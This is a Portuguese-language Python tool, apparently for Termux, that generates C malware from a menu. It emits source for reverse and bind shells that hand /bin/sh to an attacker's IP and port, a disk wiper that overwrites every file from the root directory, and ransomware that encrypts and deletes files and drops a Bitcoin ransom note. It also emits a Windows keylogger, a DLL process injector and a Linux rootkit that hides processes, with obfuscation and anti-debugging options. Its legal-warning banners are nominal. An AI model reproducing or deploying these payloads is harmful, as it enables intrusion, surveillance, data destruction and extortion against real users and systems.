#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional

# Criptografia
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from cryptography.fernet import Fernet

# Interface
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
import pygments
from pygments.lexers import CLexer, PythonLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorPayloadsCElite:
    def __init__(self):
        self.payloads = {
            'reverse_tcp': {
                'function': self.gerar_reverse_tcp,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell TCP em C'
            },
            'bind_tcp': {
                'function': self.gerar_bind_tcp,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell TCP em C'
            },
            'limpar_disco': {
                'function': self.gerar_limpador_disco,
                'category': 'Destrutivos',
                'danger_level': 'high',
                'description': 'Sobrescreve o disco com dados aleatórios'
            },
            'ransomware_basico': {
                'function': self.gerar_ransomware_basico,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa arquivos com AES em C'
            },
            'keylogger': {
                'function': self.gerar_keylogger,
                'category': 'Keyloggers',
                'danger_level': 'high',
                'description': 'Keylogger para Windows em C'
            },
            'process_injector': {
                'function': self.gerar_process_injector,
                'category': 'Injection',
                'danger_level': 'high',
                'description': 'Injetor de código em processos'
            },
            'rootkit_basico': {
                'function': self.gerar_rootkit_basico,
                'category': 'Rootkits',
                'danger_level': 'critical',
                'description': 'Rootkit básico para Linux'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'obfuscate': 'Ofuscação básica',
            'encrypt': 'Criptografia AES',
            'pack': 'Empacotamento',
            'anti_debug': 'Anti-depuração'
        }
        
        self.banners = [
            self._gerar_banner_hacker(),
            self._gerar_banner_cyber(),
            self._gerar_banner_skull()
        ]
        
        self._verificar_dependencias()
    
    def _gerar_banner_hacker(self) -> str:
        return """
[bold green]
  ______ _____ _   _ _____  _____ _____ ____  
 |  ____|_   _| \ | |  __ \|_   _/ ____/ __ \ 
 | |__    | | |  \| | |  | | | || |   | |  | |
 |  __|   | | | . ` | |  | | | || |   | |  | |
 | |     _| |_| |\  | |__| |_| || |___| |__| |
 |_|    |_____|_| \_|_____/|_____\_____\____/ 
                                               
  _____          _   _  _____ ______ _______ 
 |  __ \   /\   | \ | |/ ____|  ____|__   __|
 | |__) | /  \  |  \| | |  __| |__     | |   
 |  ___/ / /\ \ | . ` | | |_ |  __|    | |   
 | |    / ____ \| |\  | |__| | |____   | |   
 |_|   /_/    \_\_| \_|\_____|______|  |_|   
[/bold green]
[bold black on green]        GERADOR DE PAYLOADS EM C - EDITION BLACKHAT[/bold black on green]
"""

    def _gerar_banner_cyber(self) -> str:
        return """
[bold blue]
 ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗  █████╗ ██╗    ██╗██╗     ███████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██║    ██║██║     ██╔════╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝███████║██║ █╗ ██║██║     █████╗  
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔═══╝ ██╔══██║██║███╗██║██║     ██╔══╝  
╚██████╗   ██║   ██║  ██║███████╗██║  ██║    ██║     ██║  ██║╚███╔███╔╝███████╗███████╗
 ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚══════╝
[/bold blue]
[bold white on blue]        GERADOR DE MALWARDS EM C - CYBER EDITION[/bold white on blue]
"""

    def _gerar_banner_skull(self) -> str:
        return """
[bold red]
    .-~-.
   / 7 7 \
  | \___/ |
  /  \_/  \ 
 |\ /   \ /|
 \ \|o o|/ /
  \   -   /
   | \_/ |
   |     |
   |_____|
   |     |
   |_____|
   |     |
   |_____|
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS C - SKULL EDITION[/bold white on red]
"""
    
    def _verificar_dependencias(self):
        try:
            __import__('Crypto')
            __import__('cryptography')
            __import__('rich')
            __import__('pygments')
        except ImportError as e:
            console.print(f"[red]Erro: {e}[/red]")
            if Confirm.ask("Instalar dependências automaticamente?"):
                os.system("pip install pycryptodome cryptography rich pygments")
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Perigo", style="red")
            
            categorias = {
                'Shells': "Shells em C",
                'Destrutivos': "Payloads Destrutivos",
                'Keyloggers': "Keyloggers",
                'Injection': "Injeção de Código",
                'Rootkits': "Rootkits"
            }
            
            for i, (cod, nome) in enumerate(categorias.items(), 1):
                perigo = "☠️ CRÍTICO" if cod == 'Destrutivos' else "⚠️ ALTO" if cod in ['Rootkits'] else "◎ MÉDIO"
                tabela.add_row(str(i), nome, perigo)
            
            tabela.add_row("0", "Configurações", "⚙️")
            tabela.add_row("9", "Sair", "🚪")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Shells')
            elif escolha == "2":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "3":
                self._mostrar_submenu('Keyloggers')
            elif escolha == "4":
                self._mostrar_submenu('Injection')
            elif escolha == "5":
                self._mostrar_submenu('Rootkits')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            titulo = f"[bold]{categoria.upper()}[/bold] - Selecione"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style="bold blue"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descrição")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retornar", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode causar danos permanentes\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar criação?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_codigo(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload)
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload in ['reverse_tcp', 'bind_tcp']:
            console.print(Panel.fit(
                "[bold]Configuração[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
        
        elif nome_payload == 'ransomware_basico':
            console.print(Panel.fit(
                "[bold red]Configuração[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados!"
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione (separadas por vírgula)",
            default="1,3"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        lexer = CLexer()
        formatter = TerminalFormatter()
        
        lines = payload.split('\n')[:50]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 50:
            console.print("[yellow]... (truncado)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo",
            default=f"payload_{nome_payload}.c"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
            console.print("\n[bold]Compilar com:[/bold]")
            console.print(f"[cyan]gcc {nome_arquivo} -o {nome_arquivo[:-2]} -lssl -lcrypto[/cyan]")
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _mostrar_menu_configuracao(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Testar ofuscação")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=["0", "1"],
                show_choices=False
            )
            
            if escolha == "1":
                self._testar_ofuscacao()
            elif escolha == "0":
                return
    
    def _testar_ofuscacao(self):
        console.clear()
        codigo_teste = """
#include <stdio.h>
int main() {
    printf("Hello World\\n");
    return 0;
}"""
        
        console.print(Panel.fit(
            "[bold]TESTE DE OFUSCAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        tabela = Table(title="Técnicas", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Técnica")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione",
            choices=[str(i) for i in range(1, len(self.tecnicas_ofuscacao)+1)],
            show_choices=False
        )
        
        tecnica = list(self.tecnicas_ofuscacao.keys())[int(escolha)-1]
        codigo_ofuscado = self._ofuscar_codigo(codigo_teste, tecnica)
        
        console.print("\nResultado:")
        console.print(Syntax(codigo_ofuscado, "c"))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_codigo(self, payload: str, tecnica: str) -> str:
        if tecnica == 'obfuscate':
            return self._ofuscar_basico(payload)
        elif tecnica == 'encrypt':
            return self._ofuscar_com_criptografia(payload)
        elif tecnica == 'pack':
            return self._empacotar_codigo(payload)
        elif tecnica == 'anti_debug':
            return self._adicionar_anti_debug(payload)
        return payload
    
    def _ofuscar_basico(self, payload: str) -> str:
        # Substitui variáveis por nomes aleatórios
        vars = ["main", "printf", "return"]
        new_vars = {}
        
        for var in vars:
            new_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            new_vars[var] = new_name
        
        for old, new in new_vars.items():
            payload = payload.replace(old, new)
        
        return payload
    
    def _ofuscar_com_criptografia(self, payload: str) -> str:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(payload.encode())
        
        return f"""
#include <stdio.h>
#include <string.h>
#include <openssl/aes.h>

void decrypt_and_execute(unsigned char *ciphertext, int ciphertext_len) {{
    AES_KEY aes_key;
    unsigned char key[] = "{key.decode()}";
    unsigned char iv[AES_BLOCK_SIZE] = {{0}};
    
    AES_set_decrypt_key(key, 128, &aes_key);
    AES_cbc_encrypt(ciphertext, ciphertext, ciphertext_len, &aes_key, iv, AES_DECRYPT);
    
    // Executar o código decriptado seria complexo em C puro
    // Aqui apenas demonstramos o conceito
}}

int main() {{
    unsigned char encrypted[] = {{{', '.join([str(b) for b in encrypted])}}};
    decrypt_and_execute(encrypted, sizeof(encrypted));
    return 0;
}}"""
    
    def _empacotar_codigo(self, payload: str) -> str:
        compressed = zlib.compress(payload.encode())
        hex_str = ', '.join([f'0x{x:02x}' for x in compressed])
        
        return f"""
#include <stdio.h>
#include <string.h>
#include <zlib.h>

int main() {{
    unsigned char compressed[] = {{{hex_str}}};
    unsigned char decompressed[1024];
    uLongf decompressed_len = sizeof(decompressed);
    
    uncompress(decompressed, &decompressed_len, compressed, sizeof(compressed));
    
    // Em um caso real, você precisaria de um interpretador ou compilador JIT
    // para executar o código descomprimido
    printf("Código descomprimido:\\n%.*s", (int)decompressed_len, decompressed);
    
    return 0;
}}"""
    
    def _adicionar_anti_debug(self, payload: str) -> str:
        anti_debug_code = """
#ifdef __linux__
#include <sys/ptrace.h>
int anti_debug() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1; // Debugger detectado
    }
    return 0;
}
#elif _WIN32
#include <windows.h>
int anti_debug() {
    if (IsDebuggerPresent()) {
        return 1; // Debugger detectado
    }
    return 0;
}
#endif
"""
        return anti_debug_code + payload

    # Implementações dos payloads em C
    def gerar_reverse_tcp(self, ip: str, porta: int, **kwargs) -> str:
        return f"""
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {{
    int sockfd;
    struct sockaddr_in addr;
    
    // Criar socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons({porta});
    inet_aton("{ip}", &addr.sin_addr);
    
    // Conectar ao atacante
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    
    // Redirecionar STDIN, STDOUT, STDERR para o socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    // Executar shell
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}}"""

    def gerar_bind_tcp(self, ip: str, porta: int, **kwargs) -> str:
        return f"""
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {{
    int sockfd, clientfd;
    struct sockaddr_in addr;
    
    // Criar socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons({porta});
    addr.sin_addr.s_addr = inet_addr("{ip}");
    
    // Bind e listen
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 1);
    
    // Aceitar conexão
    clientfd = accept(sockfd, NULL, NULL);
    
    // Redirecionar STDIN, STDOUT, STDERR
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);
    
    // Executar shell
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}}"""

    def gerar_limpador_disco(self, **kwargs) -> str:
        return """
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

void overwrite_file(const char *path) {
    int fd = open(path, O_WRONLY);
    if (fd != -1) {
        char buf[1024];
        memset(buf, 0, sizeof(buf));
        write(fd, buf, sizeof(buf));
        close(fd);
    }
}

void traverse_dir(const char *dirpath) {
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    char path[1024];

    if ((dir = opendir(dirpath)) == NULL) return;

    while ((entry = readdir(dir)) != NULL) {
        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
        
        if (lstat(path, &statbuf) == -1) continue;
        
        if (S_ISDIR(statbuf.st_mode)) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                traverse_dir(path);
            }
        } else {
            overwrite_file(path);
        }
    }
    closedir(dir);
}

int main() {
    traverse_dir("/");
    return 0;
}"""

    def gerar_ransomware_basico(self, extensoes: List[str], resgate: str, **kwargs) -> str:
        ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
        return f"""
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

const char *extensions[] = {{{ext_str}}};
const int num_extensions = sizeof(extensions)/sizeof(extensions[0]);

void encrypt_file(const char *filename) {{
    FILE *fp_in, *fp_out;
    unsigned char key[32], iv[AES_BLOCK_SIZE];
    AES_KEY aes_key;
    unsigned char buffer[1024];
    int bytes_read;
    char out_filename[1024];
    
    // Gerar chave e IV aleatórios
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));
    
    // Configurar chave AES
    AES_set_encrypt_key(key, 256, &aes_key);
    
    // Abrir arquivos
    fp_in = fopen(filename, "rb");
    if (!fp_in) return;
    
    snprintf(out_filename, sizeof(out_filename), "%s.encrypted", filename);
    fp_out = fopen(out_filename, "wb");
    if (!fp_out) {{ fclose(fp_in); return; }}
    
    // Escrever IV no início do arquivo
    fwrite(iv, 1, sizeof(iv), fp_out);
    
    // Criptografar arquivo
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp_in)) {{
        AES_cbc_encrypt(buffer, buffer, bytes_read, &aes_key, iv, AES_ENCRYPT);
        fwrite(buffer, 1, bytes_read, fp_out);
    }}
    
    fclose(fp_in);
    fclose(fp_out);
    
    // Remover arquivo original
    remove(filename);
}}

void create_ransom_note() {{
    FILE *fp = fopen("LEIA-ME.txt", "w");
    if (fp) {{
        fprintf(fp, "{resgate}\\n\\n");
        fprintf(fp, "Para recuperar seus arquivos, envie 0.5 BTC para...\\n");
        fclose(fp);
    }}
}}

void traverse_dir(const char *dirpath) {{
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    char path[1024];

    if ((dir = opendir(dirpath)) == NULL) return;

    while ((entry = readdir(dir)) != NULL) {{
        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
        
        if (lstat(path, &statbuf) == -1) continue;
        
        if (S_ISDIR(statbuf.st_mode)) {{
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {{
                traverse_dir(path);
            }}
        }} else {{
            for (int i = 0; i < num_extensions; i++) {{
                if (strstr(entry->d_name, extensions[i])) {{
                    encrypt_file(path);
                    break;
                }}
            }}
        }}
    }}
    closedir(dir);
}}

int main() {{
    traverse_dir("/");
    create_ransom_note();
    return 0;
}}"""

    def gerar_keylogger(self, **kwargs) -> str:
        return """
#ifdef _WIN32
#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            FILE *fp = fopen("keylog.txt", "a");
            if (fp) {
                fprintf(fp, "%c", (char)pKey->vkCode);
                fclose(fp);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(hHook);
    return 0;
}
#else
#include <stdio.h>
int main() {
    printf("Keylogger só suportado no Windows\\n");
    return 0;
}
#endif
"""

    def gerar_process_injector(self, **kwargs) -> str:
        return """
#ifdef _WIN32
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Uso: %s <PID> <DLL_PATH>\\n", argv[0]);
        return 1;
    }
    
    DWORD pid = atoi(argv[1]);
    const char *dll_path = argv[2];
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("Falha ao abrir processo\\n");
        return 1;
    }
    
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dll_path)+1, 
                                    MEM_COMMIT, PAGE_READWRITE);
    if (!pDllPath) {
        printf("Falha ao alocar memória\\n");
        CloseHandle(hProcess);
        return 1;
    }
    
    if (!WriteProcessMemory(hProcess, pDllPath, dll_path, strlen(dll_path)+1, NULL)) {
        printf("Falha ao escrever memória\\n");
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    LPTHREAD_START_ROUTINE pLoadLibrary = 
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, 
                                      pDllPath, 0, NULL);
    if (!hThread) {
        printf("Falha ao criar thread\\n");
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    printf("DLL injetada com sucesso!\\n");
    return 0;
}
#else
#include <stdio.h>
int main() {
    printf("Injetor só suportado no Windows\\n");
    return 0;
}
#endif
"""

    def gerar_rootkit_basico(self, **kwargs) -> str:
        return """
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define MODULE_NAME "rootkit"

static asmlinkage long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static char hidden_process[] = "secret_process";

asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret = orig_getdents64(fd, dirp, count);
    struct linux_dirent64 *dir;
    int i;
    
    if (ret <= 0)
        return ret;
        
    for (i = 0; i < ret;) {
        dir = (struct linux_dirent64 *) ((char *)dirp + i);
        
        if (strstr(dir->d_name, MODULE_NAME) || strstr(dir->d_name, hidden_process)) {
            memmove(dir, (char *)dir + dir->d_reclen, ret - i - dir->d_reclen);
            ret -= dir->d_reclen;
            continue;
        }
        i += dir->d_reclen;
    }
    return ret;
}

asmlinkage long hacked_kill(pid_t pid, int sig) {
    if (sig == 64) {
        printk(KERN_INFO "Rootkit ativado!\\n");
        return 0;
    }
    return orig_kill(pid, sig);
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit carregado\\n");
    
    // Hook syscalls
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
    
    orig_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
    
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restaurar syscalls originais
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    
    printk(KERN_INFO "Rootkit descarregado\\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
"""

    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsCElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
